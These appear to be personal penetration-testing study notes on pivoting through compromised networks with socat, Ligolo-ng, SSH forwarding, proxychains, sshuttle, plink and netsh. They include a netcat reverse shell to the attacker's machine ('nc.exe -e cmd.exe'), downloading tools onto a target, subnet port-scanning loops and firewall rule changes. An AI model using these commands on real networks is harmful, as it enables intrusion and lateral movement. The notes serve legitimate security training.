<h3 id="port-forwarding">Port Forwarding</h3>
<p><strong>Upgrading terminal</strong></p>
<ul>
<li>Might need to run <code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</code> to upgrade terminal</li>
</ul>
<p><strong>Port Redirection and Tunneling examples</strong></p>
<ul>
<li>Port redirection (a type of forwarding): take traffic from one socket and passing it to another</li>
<li>Tunneling: Encapsulating one type of data inside another (like HTTP inside SSH)</li>
<li><strong>How do you know when to port forward?</strong><ul>
<li>Once inside a box, use <code>ip addr</code>, <code>ipconfig</code>, and <code>ip route</code> to find connected subnets</li>
<li>Then, use scripts like <code>for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done</code> to find open ports (a basic nmap for linux)<ul>
<li>Use <code>1..254|%{$ip=&quot;172.16.50.$_&quot;;$p=445;$t=New-Object Net.Sockets.TcpClient;$r=$t.BeginConnect($ip,$p,$null,$null);if($r.AsyncWaitHandle.WaitOne(1000)){try{$t.EndConnect($r);Write-Host &quot;$ip`:$p open&quot;}catch{}}else{Write-Host &quot;$ip`:$p closed&quot;};$t.Close()}</code> for powershell</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>Port forwarding with Linux</strong></p>
<ul>
<li>Useful in situations where we need to access an internal server through a DMZ machine we own</li>
<li>One way of doing this is starting a verbose (-ddd) Socat process listening on some port and forwarding traffic to the internal IP<ul>
<li><code>socat -ddd TCP-LISTEN:{External_Port},fork TCP:{Internal_IP}:{Internal Port}</code></li>
</ul>
</li>
<li>Can also use <em>rinetd</em>, netcat + FIFO named pipe, or <em>iptables</em> if we have root</li>
</ul>
<h3 id="ligolo-ng">Ligolo-ng</h3>
<ul>
<li><a href="https://github.com/nicocha30/ligolo-ng/releases/tag/v0.6.2">https://github.com/nicocha30/ligolo-ng/releases/tag/v0.6.2</a></li>
<li>Download a proxy file for kali and an agent file for the DMZ machine</li>
<li>Setup on kali:<ul>
<li><code>sudo ip tuntap add user kali mode tun ligolo</code></li>
<li><code>sudo ip link set ligolo up</code></li>
<li><code>./kali-proxy -selfcert</code><ul>
<li>This will return a port</li>
</ul>
</li>
</ul>
</li>
<li>(Windows) agent:<ul>
<li><code>ligolo-agent.exe -connect {kali_IP}:{kali_port} -ignore-cert</code></li>
<li>This program won&#39;t exit</li>
</ul>
</li>
<li>Join a session: <code>session</code>, then specify session number</li>
<li>Adding a pivot (After grabbing network information from client and session running):<ul>
<li>On kali: <code>sudo ip route add {ipconfig_IP}/{mask} dev ligolo</code><ul>
<li>Make sure the final IP portion, in front of the mask, is 0 (otherwise <code>ip</code> will get mad)</li>
</ul>
</li>
<li>Within DMZ session on ligolo: <code>start</code></li>
</ul>
</li>
<li>Now, we should literally have access to internal machines as though Kali was in the network</li>
<li>Reverse shell from internal machine -&gt; DMZ -&gt; kali:<ul>
<li><code>listener_add --addr 0.0.0.0:1338 --to 127.0.0.1:{kali_listening_port}</code><ul>
<li>This created a listener on the DMZ machine on port 1338 to forward all traffic to kali on port 4444</li>
</ul>
</li>
<li>Then, we send reverse shells to port 1338 on the DMZ machine, rather than our kali IP</li>
</ul>
</li>
<li>File upload to internal machine:<ul>
<li><code>python -m http.server</code> on kali</li>
<li><code>listener_add --addr 0.0.0.0:1339 --to 127.0.0.1:8000</code><ul>
<li>Forwarding all traffic that reaches DMZ on 1339 to kali on 8000</li>
</ul>
</li>
<li>Now, we <code>iwr/wget {DMZ_IP}:1339/{file}</code><h3 id="ssh-tunneling">SSH Tunneling</h3>
</li>
</ul>
</li>
<li>Can also be referred to as &quot;SSH Port Forwarding&quot;</li>
<li>SSH was designed to securely transmit traffic, so it was used initially for a lot of tunneling</li>
</ul>
<p><strong>SSH Local Port Forwarding</strong></p>
<ul>
<li>Done with SSH&#39;s <code>-L</code> option<ul>
<li>Used to forward incoming traffic on the current machine from the machine we SSH INTO to another machine</li>
<li><code>ssh -N -L 0.0.0.0:{current_machine_inbound_port}:{2nd_hop_forwarding_IP}:{forwarding_port} {username}@{intermediary_machine_IP}</code><ul>
<li><code>0.0.0.0</code> just means listening on all interfaces</li>
<li><code>-N</code> just means don&#39;t show output, so we only see forwarding-related stuff</li>
</ul>
</li>
<li>Basically, we are in the network-facing machine. We want to forward traffic from one-hop to two-hops away to an arbitrary port, so we ssh from the pwned box into the one-hop box with the port-forwarding info. The info states that our port (in the example, 4455) will accept incoming connections (e.g. outside the network), send those along ssh, and then ssh on the one-hop machine will forward the traffic to the two-hop machine&#39;s port specific in the ssh-command. jeez</li>
</ul>
</li>
</ul>
<p><strong>SSH Dynamic Port Forwarding</strong></p>
<ul>
<li>Useful when we want to do more than a 1:1 port forward<ul>
<li>This basically allows us to shift our commands one machine down</li>
</ul>
</li>
<li>OpenSSH uses a SOCKS proxy server port to listen, enabling this technique</li>
<li>Uses the <code>-D</code> option</li>
<li>Usage: <code>ssh -N -D 0.0.0.0:{inbound_port} {username}@{IP}</code><ul>
<li>This opens 9999 on the internet-facing machine that we control and tells it to accept and forward SOCKS traffic, as shown below</li>
</ul>
</li>
<li>Then, use <em>ProxyChains</em> to communicate over SOCKS<ul>
<li>Edit <code>/etc/proxychains4.conf</code>, putting &quot;socks5 {IP} {port} at the end&quot;<ul>
<li>This IP and port are the entrance to the internal network that we control</li>
</ul>
</li>
<li><code>proxychains {command} -L //{IP}/ -U {username} --password={password}</code><ul>
<li><code>{command}</code> could be anything, like <code>smbclient</code> or <code>nmap</code></li>
<li>The SOCKS traffic would be forwarded to the IP from the machine ssh&#39;d into</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>SSH Remote Port Forwarding</strong></p>
<ul>
<li>It&#39;s basically using an SSH tunnel&#39;s egress traffic to send commands through the client</li>
<li>Useful when firewalls are getting in the way (e.g. can&#39;t ssh in/open new ports)<ul>
<li>Thus, we set up an SSH server on OUR machine and bind the listening port to the loopback interface<ul>
<li>Will need to run <code>sudo systemctl start ssh</code></li>
<li>This does mean that we&#39;re giving the compromised machine our LITERAL credentials, so it might be good to create a new user lmfao</li>
</ul>
</li>
<li>This means that packets sent are pushed through the SSH tunnel back to the compromised DMZ machine</li>
</ul>
</li>
<li>Uses the <code>-R</code> option, run from compromised DMZ machine</li>
<li>Example: listening on 2345 on Kali and forwarding traffic to the 1-hop internal machine<ul>
<li><code>ssh -N -R localhost:{2345}:{internal_1hop_IP}:{internal_1hop_port} username@{kali_IP}</code></li>
</ul>
</li>
<li>Traffic can then be sent to the machine by sending traffic to that port on localhost<ul>
<li>Example: <code>psql -h localhost -p {2345} -U {username}</code></li>
</ul>
</li>
</ul>
<p><strong>SSH Remote Dynamic Port Forwarding</strong></p>
<ul>
<li>Remote, and forwards traffic based on where they&#39;re addressed</li>
<li>Example running on 9998:<ul>
<li><code>ssh -N -R 9998 kali@{kali_IP}</code></li>
<li>Then, in <code>/etc/proxychains4.conf</code>:<ul>
<li><code>socks5 127.0.0.1 9998</code></li>
</ul>
</li>
<li><code>proxychains {command with internal 1-hop IP as target}</code><ul>
<li><code>proxychains nmap {internal_IP}</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>Using sshuttle</strong></p>
<ul>
<li>Basically turns SSH into a VPN</li>
<li>First, port forward in traffic on the pwned machine on a certain port<ul>
<li>For example, use Socat to allow inbound traffic on 2222, forward it to new machine (whose credentials we know) on port 22, since we&#39;re ssh&#39;ing into that machine</li>
</ul>
</li>
<li>Then, <code>sshuttle -r {user}@{pwned_target_IP}:{pwned_target_port} {subnet1} {subnet2}</code><ul>
<li>The subnets are ones that we require access to from the pwned machine</li>
</ul>
</li>
<li>Then, we can just make requests to hosts in the subnet<ul>
<li>For example, <code>nmap {private_IP}</code></li>
</ul>
</li>
</ul>
<h3 id="port-forwarding-with-windows-tools">Port Forwarding with Windows Tools</h3>
<p><strong>Using SSH on Windows</strong></p>
<ul>
<li>Pretty much the same, as it&#39;s OpenSSH - comes bundled with Windows after 2018</li>
<li>Remote Dynamic port forward:<ul>
<li>Same as linux <code>ssh -N -R {kali_port} kali@{kali_IP}</code></li>
<li>Modify kali <code>/etc/proxychains4.conf</code> to have <code>socks5 127.0.0.1 {kali_ssh_port}</code></li>
<li>Then, same as before, use <code>proxychains</code> with commands and internal IPs passed</li>
</ul>
</li>
</ul>
<p><strong>Plink</strong></p>
<ul>
<li>OpenSSH might not be on Windows, so Plink might be used instead</li>
<li>This is used for bypassing a firewall INTO the DMZ machine (going from shell to RDP even with RDP port blocked)</li>
<li>Need netcat on the target, located in /windows-resources/binaries/nc.exe<ul>
<li>Grab it with <code>powershell wget -uri {uri}/nc.exe -OutFile {desired_outfile.exe}</code></li>
<li>Run a shell with <code>nc.exe -e cmd.exe {kali_IP} {port}</code></li>
</ul>
</li>
<li>Download plink.exe using same command as above ^^</li>
<li><code>plink.exe -ssh -l kali -pw {pass} -R 127.0.0.1:{kali_port}:127.0.0.1:{port_we_want_to_open_on_DMZ} {kali_ip}</code><ul>
<li>This is basically just ssh&#39;ing into kali to open up a port on the DMZ machine</li>
</ul>
</li>
<li>Then, for example, <code>xfreerdp /u:{username} /p:{password} /v:127.0.0.1:{kali_port}</code>, as the box has SSH&#39;d into kali and is running on kali port, so we can rdp into that</li>
</ul>
<p><strong>Netsh</strong></p>
<ul>
<li>Built-in to the firewall, thus should require Administrator</li>
<li>Assume RDP is open, and we want to go to 1hop internal machine via SSH</li>
<li>1st, rdp using <code>xfreerdp</code></li>
<li>Then, <code>netsh interface portproxy add v4tov4 listenport={open_port} listenaddress={current_machine_IP_from_kali} connectport={port_of_1hop_machine} connectaddress={1hop_internal_IP}</code><ul>
<li>Need to open {open_port} on the firewall - <code>netsh advfirewall firewall</code><ul>
<li><code>netsh advfirewall firewall add rule name=&quot;{any_name}&quot; protocol=TCP dir=in localip={kali_ip} localport={open_port} action=allow</code></li>
<li>To delete the rule, <code>netsh advfirewall firewall delete rule &quot;{rule_name}&quot;</code></li>
</ul>
</li>
</ul>
</li>
<li>To delete the port forward, run <code>netsh interface portproxy del v4tov listenport={open_port} listenaddress={kali_IP}</code></li>
<li>Can verify what is running with <code>netstat -anp TCP</code> or <code>netsh interface portproxy show all</code></li>
</ul>
